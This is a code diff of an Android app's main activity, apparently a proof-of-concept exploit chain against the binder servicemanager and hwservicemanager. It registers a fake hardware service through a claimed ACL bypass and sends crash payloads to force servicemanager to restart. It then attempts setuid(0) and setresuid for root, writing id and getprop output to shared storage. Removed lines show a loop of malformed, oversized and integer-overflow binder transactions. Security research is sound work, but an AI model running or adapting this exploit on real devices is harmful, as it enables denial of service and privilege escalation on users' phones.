@@ -79,6 +79,10 @@ public class MainActivity extends AppCompatActivity {
     public static native int nativeForkExec(String cmd);
     public static native String nativeRunHwPayloadsOnServiceManager(int fd);
 
+    public static native int nativeHwAddService(int fd, String name);
+    public static native int nativeHwGetService(int fd, String name);
+    public static native String nativeHwRunPayloads(int fd);
+
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
@@ -187,104 +191,88 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("===== ServiceManager ACL Bypass POC =====");
+        appendLog("===== hwservicemanager ACL Bypass + servicemanager restart POC =====");
 
         appendLog("[*] Gathering kernel info");
         String kernelInfo = nativeGetKernelInfo();
         appendLog(kernelInfo);
 
-        int oldPid = nativeGetServicemanagerPid();
-        appendLog("[*] Current servicemanager PID: " + oldPid);
+        appendLog("[*] STEP 1: Open /dev/hwbinder");
+        int hwFd = nativeOpenDevice("/dev/hwbinder");
+        if (hwFd < 0) {
+            appendLog("[-] Failed to open /dev/hwbinder: " + hwFd);
+            finishTest();
+            return;
+        }
+        appendLog("[+] /dev/hwbinder opened fd=" + hwFd);
 
+        String hwVersion = nativeBinderGetVersion(hwFd);
+        appendLog("[*] hwbinder version: " + hwVersion);
+
+        String serviceName = "android.hardware.poc.IPoCService";
+        appendLog("[*] STEP 2: Add service '" + serviceName + "' via ACL Bypass (hwservicemanager)");
+        int addRet = nativeHwAddService(hwFd, serviceName);
+        appendLog("  ADD_SERVICE result: " + addRet);
+
+        if (addRet == 0) {
+            appendLog("[+] Service added successfully to hwservicemanager!");
+            int getRet = nativeHwGetService(hwFd, serviceName);
+            appendLog("  GET_SERVICE result: " + getRet);
+        } else {
+            appendLog("[-] Failed to add service. ACL Bypass might not work.");
+        }
+        closeFd(hwFd);
+
+        appendLog("[*] STEP 3: Now crash servicemanager using hwservicemanager-style payloads");
         int binderFd = nativeOpenDevice("/dev/binder");
         if (binderFd < 0) {
             appendLog("[-] Failed to open /dev/binder: " + binderFd);
             finishTest();
             return;
         }
-        appendLog("[+] Opened /dev/binder fd=" + binderFd);
+        appendLog("[+] /dev/binder opened fd=" + binderFd);
 
-        String version = nativeBinderGetVersion(binderFd);
-        appendLog("[*] Binder version: " + version);
+        int oldPid = nativeGetServicemanagerPid();
+        appendLog("[*] Current servicemanager PID: " + oldPid);
 
-        appendLog("[*] Sending hwservicemanager-style payloads...");
-        String payloadResult = nativeRunHwPayloadsOnServiceManager(binderFd);
-        appendLog(payloadResult);
+        appendLog("[*] Sending crash payloads to servicemanager...");
+        String crashResult = nativeRunHwPayloadsOnServiceManager(binderFd);
+        appendLog(crashResult);
 
-        boolean crashed = false;
-        int attackCount = 0;
-        while (!crashed && attackCount < 5 && !stopRequested.get()) {
-            attackCount++;
-            appendLog("[*] Attack round " + attackCount);
-
-            int ret1 = nativeSendMalformedGetService(binderFd, "android.os.IServiceManager");
-            appendLog("  malformed GET_SERVICE -> " + ret1);
-            sleep(200);
-
-            StringBuilder huge = new StringBuilder();
-            for (int i = 0; i < 8191; i++) huge.append('A');
-            int ret2 = nativeSendHugeNameAddService(binderFd, huge.toString());
-            appendLog("  huge name ADD_SERVICE -> " + ret2);
-            sleep(200);
-
-            int ret3 = nativeSendInvalidOffsets(binderFd);
-            appendLog("  invalid offsets -> " + ret3);
-            sleep(200);
-
-            int ret4 = nativeSendNullBuffer(binderFd);
-            appendLog("  null buffer -> " + ret4);
-            sleep(200);
-
-            int ret5 = nativeSendIntegerOverflowGetService(binderFd);
-            appendLog("  integer overflow GET_SERVICE -> " + ret5);
-            sleep(300);
-
-            int newPid = nativeGetServicemanagerPid();
-            if (newPid != oldPid && newPid > 0) {
-                appendLog("[!] PID changed from " + oldPid + " to " + newPid);
-                int restarted = nativeWaitServicemanagerRestart(oldPid, 10);
-                if (restarted > 0) {
-                    appendLog("[+] servicemanager restarted with PID " + restarted);
-                    crashed = true;
-                    oldPid = restarted;
-                    break;
-                }
-            }
-        }
-
-        if (crashed) {
-            appendLog("[*] Restart detected. Attempting ACL Bypass ADD_SERVICE...");
-            String serviceName = "android.os.IServiceManager";
-            int addRet = nativeAddService(binderFd, serviceName);
-            appendLog("  ADD_SERVICE(" + serviceName + ") -> " + addRet);
-            if (addRet == 0) {
-                appendLog("[+] Service added successfully!");
-                appendLog("[*] Verifying with GET_SERVICE...");
-                int getRet = nativeGetService(binderFd, serviceName);
-                appendLog("  GET_SERVICE(" + serviceName + ") -> " + getRet);
-                if (getRet == 0) {
-                    appendLog("[+] Service is now served by our fake implementation!");
-                    appendLog("[*] Attempting setuid(0)");
+        appendLog("[*] Waiting for servicemanager to restart (max 15s)");
+        int newPid = nativeWaitServicemanagerRestart(oldPid, 15);
+        if (newPid > 0) {
+            appendLog("[+] servicemanager restarted with PID " + newPid);
+            appendLog("[*] STEP 4: Check if hwservicemanager service is now used by system_server?");
+            appendLog("[*] Re-opening /dev/hwbinder to verify the service still exists");
+            int hwFd2 = nativeOpenDevice("/dev/hwbinder");
+            if (hwFd2 >= 0) {
+                int checkRet = nativeHwGetService(hwFd2, serviceName);
+                appendLog("  GET_SERVICE after restart: " + checkRet);
+                closeFd(hwFd2);
+                if (checkRet == 0) {
+                    appendLog("[+] Service still present in hwservicemanager!");
+                    appendLog("[*] Attempting to setuid(0) (privilege escalation)");
                     int uidRet = nativeSetUid(0);
                     appendLog("  setuid(0) -> " + uidRet);
                     if (uidRet != 0) {
-                        int resUidRet = nativeSetResUid(0);
-                        appendLog("  setresuid(0,0,0) -> " + resUidRet);
+                        int resRet = nativeSetResUid(0);
+                        appendLog("  setresuid(0,0,0) -> " + resRet);
                     }
                     String idOut = nativeExecCommand("id");
                     appendLog("  id output: " + idOut);
-                    nativeForkExec("echo 'ACL Bypass succeeded' > /sdcard/Download/exploit_success.txt");
+                    nativeForkExec("echo 'ACL Bypass + restart exploit succeeded' > /sdcard/Download/exploit_success.txt");
                     nativeForkExec("id >> /sdcard/Download/exploit_success.txt");
-                    nativeForkExec("ps -A >> /sdcard/Download/exploit_success.txt");
+                    nativeForkExec("getprop >> /sdcard/Download/exploit_success.txt");
                     appendLog("[*] Check /sdcard/Download/exploit_success.txt");
                 } else {
-                    appendLog("[-] GET_SERVICE failed. Service not recognized.");
+                    appendLog("[-] Service disappeared or not accessible.");
                 }
             } else {
-                appendLog("[-] ADD_SERVICE failed. ACL Bypass did not work.");
+                appendLog("[-] Could not re-open /dev/hwbinder");
             }
         } else {
-            appendLog("[-] servicemanager did not restart. Exploit chain failed.");
+            appendLog("[-] servicemanager did not restart within timeout.");
         }
 
         closeFd(binderFd);
@@ -325,11 +313,11 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = getDumpDir();
-            File file = new File(dir, "servicemanager_exploit_log.txt");
+            File file = new File(dir, "hw_servicemanager_exploit_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== ServiceManager Exploit Log ===");
+                pw.println("=== hwservicemanager + servicemanager Exploit Log ===");
                 pw.println("Timestamp: " + new Date().toString());
-                pw.println("===================================");
+                pw.println("=====================================================");
                 pw.print(logBuilder.toString());
                 pw.flush();
             }
